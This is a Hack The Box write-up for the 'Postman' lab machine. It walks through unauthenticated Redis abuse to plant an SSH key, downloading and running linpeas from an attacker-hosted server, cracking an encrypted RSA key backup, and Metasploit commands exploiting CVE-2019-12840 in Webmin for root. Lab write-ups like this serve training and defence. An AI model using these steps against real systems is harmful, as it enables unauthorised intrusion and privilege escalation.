---
title: 'Postman'
target: 'Hack The Box — Postman'
difficulty: 'easy'
date: 2025-11-19
summary: 'An HTB machine — scanning with naabu and nmap to find SSH (22) running OpenSSH 7.6p1, HTTP (80) running Apache 2.4.29 serving "The Cyber Geek''s Personal Website", Redis (6379) running version 4.0.9 with no authentication, and HTTPS (10000) running Webmin 1.910 on Ubuntu 18.04, connecting to Redis with redis-cli and enumerating server info to confirm unauthenticated access with CONFIG GET showing no requirepass, generating an SSH key pair and formatting the public key with newline padding into spaced_key.txt, injecting the key into Redis with redis-cli -x set ssh_key and writing it to /var/lib/redis/.ssh/authorized_keys via config set dir and dbfilename followed by save, SSHing in as the redis user, running linpeas to discover /opt/id_rsa.bak containing Matt''s encrypted RSA private key, cracking the passphrase with ssh2john and john to reveal computer2008, failing to SSH as Matt directly but succeeding with su Matt from the redis shell using the cracked passphrase, logging into Webmin as Matt with the same credentials, and exploiting CVE-2019-12840 (Webmin Package Updates RCE) via Metasploit to gain a root shell.'
role: 'pentest'
tags: ['nmap', 'naabu', 'redis', 'ssh', 'ssh-keygen', 'webmin', 'linpeas', 'john', 'ssh2john', 'metasploit', 'cve-2019-12840', 'privilege-escalation', 'linux']
problem: 'Postman is an easy-rated Ubuntu 18.04 machine with four open ports — SSH (22) running OpenSSH 7.6p1, HTTP (80) running Apache 2.4.29 serving a personal website, Redis (6379) running version 4.0.9 with no authentication required, and HTTPS (10000) running Webmin 1.910. The Redis instance allows unauthenticated access and runs as the redis user whose home directory is /var/lib/redis — a user with a valid login shell and an SSH directory. The machine also contains an encrypted RSA private key backup at /opt/id_rsa.bak belonging to the user Matt, whose passphrase can be cracked with john. Matt reuses the same password for Webmin, and the Webmin 1.910 installation is vulnerable to CVE-2019-12840 — a Package Updates module RCE that grants root when exploited with authenticated credentials.'
action: 'Ran naabu for full port discovery followed by nmap with default scripts (-sC) and version detection (-sV) to identify four open ports — 22/tcp (SSH) running OpenSSH 7.6p1, 80/tcp (HTTP) running Apache 2.4.29 with title "The Cyber Geek''s Personal Website", 6379/tcp (Redis) running version 4.0.9, and 10000/tcp (HTTP) running MiniServ 1.910 (Webmin). Connected to Redis with redis-cli and ran INFO to confirm version 4.0.9 in standalone mode. Ran CONFIG GET to check requirepass and masterauth — both empty, confirming unauthenticated access. Set the Redis working directory to /var/lib/redis/.ssh with config set dir. Generated an SSH key pair with ssh-keygen -t rsa saved as "key" with no passphrase. Created spaced_key.txt with the public key padded by blank lines before and after to survive Redis serialization. Injected the key into Redis with cat spaced_key.txt | redis-cli -h 10.129.251.176 -x set ssh_key. Verified the stored key with get ssh_key, set config dir to /var/lib/redis/.ssh, set dbfilename to authorized_keys, and ran save to write the database to disk. SSHed in as redis@10.129.251.176 using the generated private key. Enumerated the redis user home directory and confirmed the authorized_keys file contained the injected SSH key amid Redis binary data. Transferred linpeas.sh to the target via python3 HTTP server and wget. Ran linpeas and discovered /opt/id_rsa.bak — an encrypted RSA private key with DES-EDE3-CBC encryption. Copied the full key to matt_id_rsa locally, ran ssh2john.py to extract the hash, and cracked the passphrase with john using rockyou.txt — revealing computer2008. SSH as Matt with the key was rejected (connection closed), and password-only SSH was also denied. Used su Matt from the redis shell with the cracked passphrase to pivot to the Matt user and retrieved the user flag. Accessed the Webmin login at https://10.129.251.176:10000 with Matt:computer2008. Searched Metasploit for CVE-2019-12840, selected exploit/linux/http/webmin_packageupdate_rce, configured RHOSTS, USERNAME (Matt), PASSWORD (computer2008), LHOST, and SSL true. Executed the exploit to obtain a root command shell and retrieved the root flag.'
outcome: 'Gained root access to the machine through a multi-stage attack. The attack chain was naabu and nmap enumeration identifying unauthenticated Redis and Webmin, SSH key injection via Redis to gain a shell as the redis user, linpeas discovery of an encrypted RSA key backup at /opt/id_rsa.bak, john cracking the passphrase to computer2008, lateral movement to Matt via su, credential reuse to authenticate to Webmin, and CVE-2019-12840 exploitation via Metasploit for root.'
draft: false
---

## Background

Postman is an easy-rated Linux machine that demonstrates the danger of running Redis without authentication and how a single reused password can chain through multiple services to full compromise. The attack path moves through three distinct phases — gaining initial access through Redis by writing an SSH key directly into the filesystem, laterally moving to another user by cracking an encrypted key backup, and escalating to root through an authenticated Webmin vulnerability. Each phase requires a different technique, and the connection between them is password reuse — Matt's cracked SSH key passphrase also works as his Webmin login, which opens the door to the final exploit.

---

## Enumeration

Starting with a naabu scan for full port discovery, then running nmap with default scripts and version detection against the identified ports:

![Terminal showing naabu -silent -tp full -host 10.129.251.176 returning four ports — 10000, 22, 80, and 6379. Below it, nmap -sC -sV -p 22,80,6379,10000 10.129.251.176 -oA scanresult showing port 22/tcp open SSH running OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 with SSH hostkeys, port 80/tcp open HTTP running Apache httpd 2.4.29 with http-title The Cyber Geek's Personal Website, port 6379/tcp open Redis key-value store 4.0.9, and port 10000/tcp open HTTP running MiniServ 1.910 Webmin httpd. Service Info OS Linux.](/writeups/htb-postman/01-nmap-scan.png)

Four services — **SSH on port 22**, **HTTP on port 80**, **Redis on port 6379**, and **Webmin on port 10000**. The nmap output shows OpenSSH 7.6p1 on Ubuntu, Apache 2.4.29 serving "The Cyber Geek's Personal Website", Redis 4.0.9 as a key-value store, and MiniServ 1.910 running Webmin over HTTPS. The OS fingerprint confirms Linux.

Port 80 hosts a personal website that doesn't yield any useful attack surface after initial review. The Webmin instance on port 10000 presents a login panel:

![Browser showing the Webmin login page at https://10.129.251.176:10000 with Username and Password fields and a Sign in button.](/writeups/htb-postman/02-webmin-login.png)

Without credentials, Webmin is a dead end for now. Redis on port 6379, however, is worth investigating — Redis is designed for trusted environments and frequently runs without authentication.

---

## Redis enumeration

Connecting to the Redis instance with `redis-cli`:

![Terminal showing redis-cli -h 10.129.251.176 connecting successfully to 10.129.251.176:6379 with no authentication prompt.](/writeups/htb-postman/03-redis-connect.png)

The connection succeeds immediately — no password required. Running the `INFO` command to gather server details:

![Redis prompt showing INFO output with redis_version:4.0.9, redis_git_sha1:00000000, redis_git_dirty:0, redis_build_id:9435c3c2879311f3, and redis_mode:standalone.](/writeups/htb-postman/04-redis-info.png)

Redis 4.0.9 running in standalone mode. Checking the configuration for authentication settings and other useful details:

![Redis prompt showing CONFIG GET * output with dbfilename set to dump.rdb, requirepass empty, masterauth empty, and cluster-announce-ip listed.](/writeups/htb-postman/05-redis-config.png)

The `requirepass` and `masterauth` fields are both empty — the instance is completely unauthenticated. The default `dbfilename` is `dump.rdb`. With full read and write access to Redis, the next step is leveraging this to write files to the filesystem.

---

## SSH key injection via Redis

The technique for gaining a shell through an unauthenticated Redis instance is straightforward: Redis can write its in-memory database to any directory the redis user has write access to, and the redis user on this machine has a home directory at `/var/lib/redis` with a valid login shell. By setting the database directory to `/var/lib/redis/.ssh` and the filename to `authorized_keys`, any key stored in Redis gets written to disk as an authorized SSH key.

First, setting the Redis working directory to the SSH config folder:

![Redis prompt showing config set dir /var/lib/redis/.ssh returning OK, followed by config get dir confirming the directory is now /var/lib/redis/.ssh.](/writeups/htb-postman/06-redis-set-dir.png)

The directory exists and Redis has write access — both prerequisites confirmed. Next, generating an SSH key pair on the attacking machine:

![Terminal showing ssh-keygen -t rsa generating a public/private RSA key pair, saving to the file "key" with no passphrase. The SHA256 fingerprint and randomart image are displayed. Below it, ls shows the key and key.pub files alongside other scan results.](/writeups/htb-postman/07-ssh-keygen.png)

The key pair is generated as `key` (private) and `key.pub` (public). Before injecting the public key into Redis, it needs newline padding. When Redis serializes its database to disk, it writes binary metadata around each value. Without padding, the SSH key would be concatenated with this binary data on the same line, and the SSH daemon wouldn't parse it correctly. Adding blank lines before and after the key ensures it appears on its own line in the serialized output:

![Two Mousepad windows side by side. The top window shows key.pub with the ssh-rsa public key on line 1. The bottom window shows spaced_key.txt with blank lines on lines 1 through 3 and the same ssh-rsa public key on line 4, with red arrows indicating the blank line padding before and after the key.](/writeups/htb-postman/08-spaced-key.png)

The `spaced_key.txt` file wraps the public key with newlines so it survives Redis serialization intact. Injecting it into Redis:

![Terminal showing cat spaced_key.txt piped to redis-cli -h 10.129.251.176 -x set ssh_key, returning OK.](/writeups/htb-postman/09-redis-set-key.png)

The `-x` flag tells `redis-cli` to read the last argument (the value for `ssh_key`) from standard input rather than the command line. Verifying the key is stored correctly, then writing it to disk as the `authorized_keys` file:

![Redis prompt showing get ssh_key returning the full SSH public key with \n\n padding visible at the start and end. Below it, config set dir /var/lib/redis/.ssh returns OK, config set dbfilename authorized_keys returns OK, save returns OK, and exit closes the connection.](/writeups/htb-postman/10-redis-dump-keys.png)

The `save` command forces Redis to write its database to disk immediately. The in-memory database — including the SSH key — is now written to `/var/lib/redis/.ssh/authorized_keys`. Connecting via SSH using the generated private key:

![Terminal showing ssh -i key redis@10.129.251.176 connecting successfully with the Ubuntu 18.04.3 LTS welcome banner, GNU/Linux 4.15.0-58-generic x86_64. The redis@Postman prompt shows ls output with files including authorized_keys, dump.rdb, and several .so files.](/writeups/htb-postman/11-ssh-redis.png)

A shell as the `redis` user. Examining the `authorized_keys` file confirms how the injection works in practice:

![Terminal showing cat authorized_keys output — the file begins with Redis binary header data including REDIS0008, redis-ver4.0.9, redis-bits, ctime, used-mem, aof-preamble, followed by ssh_keyB9 and then the full ssh-rsa public key on its own line amid the binary data, ending with more Redis binary data and the redis@Postman prompt.](/writeups/htb-postman/12-authorized-keys.png)

The `authorized_keys` file is a Redis database dump with binary metadata, but the SSH key sits on its own line thanks to the newline padding — the SSH daemon ignores the binary lines it can't parse and finds the valid key.

---

## Lateral movement — cracking Matt's key

With a shell as `redis`, the next step is escalating to a more privileged user. Transferring linpeas to the target for automated enumeration — hosting it on the attacker machine with a Python HTTP server:

![Terminal on the attacker machine in ~/HTB/Tools showing ls linpeas.sh and python3 -m http.server 8080 serving on 0.0.0.0 port 8080.](/writeups/htb-postman/13-linpeas-server.png)

Downloading and running linpeas on the target:

![Terminal on the target as redis@Postman showing wget http://10.10.14.57:8080/linpeas.sh downloading successfully at 860KB/s, followed by chmod +x linpeas.sh and ./linpeas.sh executing with the linpeas banner starting to render.](/writeups/htb-postman/14-linpeas-download.png)

Among linpeas' findings is an interesting file — `/opt/id_rsa.bak`, a backup of an encrypted RSA private key:

![Terminal showing cat /opt/id_rsa.bak output with the header BEGIN RSA PRIVATE KEY, Proc-Type: 4,ENCRYPTED, DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C, followed by the first two lines of the base64-encoded key body.](/writeups/htb-postman/15-id-rsa-bak.png)

An encrypted private key backup sitting in `/opt` with world-readable permissions. The `DES-EDE3-CBC` encryption header indicates the key is passphrase-protected. Copying the full key to the attacking machine for cracking:

![Mousepad window showing the full matt_id_rsa file — 30 lines starting with BEGIN RSA PRIVATE KEY, Proc-Type: 4,ENCRYPTED, DEK-Info: AES-128-CBC,4FC44D79F1BC0D141DB22CCB08108C44, followed by the complete base64-encoded key body, ending with END RSA PRIVATE KEY on line 30.](/writeups/htb-postman/16-matt-id-rsa.png)

With the full key saved locally as `matt_id_rsa`, the next step is extracting a hash suitable for john. Running `ssh2john.py` against the key file produces a hash, and john with the `rockyou.txt` wordlist cracks it quickly — the passphrase is **computer2008**.

The natural next step is SSHing in as Matt using the cracked key, but this fails — the connection is immediately closed after authentication. Attempting password-only SSH with `computer2008` is also denied. However, from the existing redis shell, running `su Matt` with the password `computer2008` succeeds. This is a common scenario on HTB machines — SSH access can be restricted through `AllowUsers`, `DenyUsers`, or `AuthorizedKeysFile` directives in the SSH configuration, but local account switching with `su` bypasses all of those. The user flag was retrieved from Matt's home directory.

---

## Privilege escalation — CVE-2019-12840

With Matt's password in hand and Webmin running on port 10000, the next logical step is checking whether Matt reuses the same credentials there. Logging into the Webmin panel at `https://10.129.251.176:10000` with `Matt:computer2008` succeeds — password reuse across services.

Webmin 1.910 is vulnerable to **CVE-2019-12840**, a remote code execution vulnerability in the Package Updates module. The vulnerability allows an authenticated user with access to the Package Updates feature to execute arbitrary commands as root, because the module passes user-controlled input to a system command without proper sanitization.

Searching Metasploit for the CVE and selecting the `exploit/linux/http/webmin_packageupdate_rce` module:

```
msf6 > search cve-2019-12840
msf6 > use exploit/linux/http/webmin_packageupdate_rce
```

Configuring the exploit with Matt's credentials and the target details:

```
msf6 exploit(linux/http/webmin_packageupdate_rce) > set RHOSTS 10.129.251.176
msf6 exploit(linux/http/webmin_packageupdate_rce) > set USERNAME Matt
msf6 exploit(linux/http/webmin_packageupdate_rce) > set PASSWORD computer2008
msf6 exploit(linux/http/webmin_packageupdate_rce) > set LHOST 10.10.14.57
msf6 exploit(linux/http/webmin_packageupdate_rce) > set SSL true
msf6 exploit(linux/http/webmin_packageupdate_rce) > run
```

The exploit fires and opens a command shell session as **root**. The root flag was retrieved from `/root/root.txt`.

---

## What I took from this

Postman's attack chain revolves around two themes — services exposed without authentication and password reuse. Redis running without `requirepass` is the entry point, and it's a design choice rather than a vulnerability in Redis itself. Redis was built as an in-memory data store for trusted environments, and its documentation explicitly warns against exposing it to untrusted networks. The SSH key injection technique exploits Redis' ability to write its database to arbitrary filesystem paths — a feature, not a bug — but one that becomes dangerous when the service runs without authentication on a user account that has SSH access. The newline padding trick is worth remembering: any data written through Redis ends up wrapped in binary serialization metadata, so injected content that needs to be parsed line-by-line (like `authorized_keys`) requires padding to stay isolated from the binary noise.

The lateral movement phase highlights why encrypted key backups in world-readable locations are a security risk even when the passphrase is strong. `computer2008` is not a trivial password, but it falls to a dictionary attack with `rockyou.txt` in seconds. The more important lesson is the failed SSH attempt — Matt's SSH access was restricted, so the key couldn't be used directly, but the cracked passphrase still had value because it was reused as Matt's account password for `su` and his Webmin login. A single cracked credential opened two separate doors.

The privilege escalation through CVE-2019-12840 is an example of authenticated RCE — the vulnerability requires valid credentials, so it's not exploitable from an unauthenticated position. But once Matt's password is known, the Webmin instance becomes a direct path to root. The broader pattern here is that web administration panels like Webmin, phpMyAdmin, and similar tools often run as root or with root-equivalent privileges, and an authenticated RCE in any of them is effectively a privilege escalation from whatever user's credentials you have to root. Password reuse between system accounts and web admin panels is the bridge that connects those two privilege levels.
